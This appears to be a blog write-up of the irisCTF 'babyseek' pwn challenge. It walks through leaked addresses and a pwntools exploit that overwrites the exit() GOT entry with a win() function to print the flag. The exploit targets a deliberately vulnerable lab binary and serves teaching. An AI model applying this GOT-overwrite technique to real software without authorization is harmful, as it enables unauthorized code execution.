---
title: "irisCTF babyseek"
date: 2023-02-01T12:13:32+05:30
description: "Oh no, ya didn't use Full RELRO... RIP GOT."
tags: [python, GOT, pwn]
---

## The Challenge

I'll let you seek around my file as far as you want, but you can't go anywhere since it's /dev/null.\
Author: sera\
[seek.zip](https://cdn.discordapp.com/attachments/1056103369695047750/1060457227770671104/seek.zip)\
`nc seek.chal.irisc.tf 10004`

## The Provided ZIP

- chal
  - Provided binary
- chal.c
  - Source which binary comes from
- Makefile
  - Provided compilation flags
- Dockerfile
  - Dockerfile running on the server

## Protections

```bash
[*] '/root/workspace/vr_pres2/seek/chal'
    Arch:           amd64-64-little
    RELRO:          No RELRO
    Stack:          No canary found
    NX:             NX enabled
    PIE:            PIE enabled
```

Welp, if we can overflow and overwrite the GOT, seems like we're in the home stretch. No canary is included either so we can buffer overflow.

## Wait, I see a win()

```c
#include <stdlib.h>
#include <stdio.h>

void win() {
    system("cat /root/workspace/vr_pres2/seek/flag.txt");
}
```

## chal.c main()

```c
printf("Your flag is located around %p.\n", win);       // Leaked win() function
FILE* null = fopen("/dev/null", "w");
int pos = 0;
void* super_special = &win;
fwrite("void", 1, 4, null);
printf("I'm currently at %p.\n", null->_IO_write_ptr);  // Leaked null pointer
printf("I'll let you write the flag into nowhere!\n");
printf("Where should I seek into? ");
scanf("%d", &pos);                                      // Integer input
null->_IO_write_ptr += pos;
fwrite(&super_special, sizeof(void*), 1, null);         // Overwrite???
exit(0)
```

## Plan of Attack

1. Get the leaked win() address
2. Get the leaked file pointer address
3. Calculate offset to overwrite GOT exit()
4. Input computed integer into scanf()
5. Overwrite GOT via fwrite()
6. Shell?

## Understanding fwrite()

```c
size_t fwrite(
    const void *ptr,    // Pointer to be written from 
    size_t size,        // Number of bytes to be written
    size_t nmemb,       // Number of elements to be written
    FILE *stream        // File pointer output
)
```

## Let's PWN

```py
p.recvuntil(b'Your flag is located around ')
win_leak = int(p.recvuntilS(b'.\n').strip(".\n"), 16)
print(f"Win func is at {hex(win_leak)}")
p.recvuntil(b'I\'m currently at ')
pointer_leak = int(p.recvuntilS(b'\n').strip(".\n"), 16)
print(f"Pointer is at {hex(pointer_leak)}")

got_address = e.got["exit"] + (win_leak - e.sym["win"])   # Get base address of program to exit GOT entry
overwrite_offset = got_address - pointer_leak             # Move pointer down over the GOT
overwrite_offset_str = str(overwrite_offset).encode()     # Make into bytes string for send

p.sendline(overwrite_offset_str)
p.recvall()
```

## Flag Acquired

`irisctf{not_quite_fseek}`

## Final Exploit Code

```py
# GOT overwritten lol
from pwn import *
context.log_level = 'debug'

# Setup for Run
binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]

gs = '''
continue
'''

# Load In Binary & ROPGadget it
e = context.binary = ELF(binary,checksec=False)
r = ROP(e)

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)

# Stuff
p = start()

p.recvuntil(b'Your flag is located around ')
win_leak = int(p.recvuntilS(b'.\n').strip(".\n"), 16)
print(f"Win func is at {hex(win_leak)}")
p.recvuntil(b'I\'m currently at ')
pointer_leak = int(p.recvuntilS(b'\n').strip(".\n"), 16)
print(f"Pointer is at {hex(pointer_leak)}")

got_address = e.got["exit"] + (win_leak - e.sym["win"])   # Get base address of program to exit GOT entry
overwrite_offset = got_address - pointer_leak             # Move pointer down over the GOT
overwrite_offset_str = str(overwrite_offset).encode()     # Make into bytes string for send

p.sendline(overwrite_offset_str)
p.recvall()
```
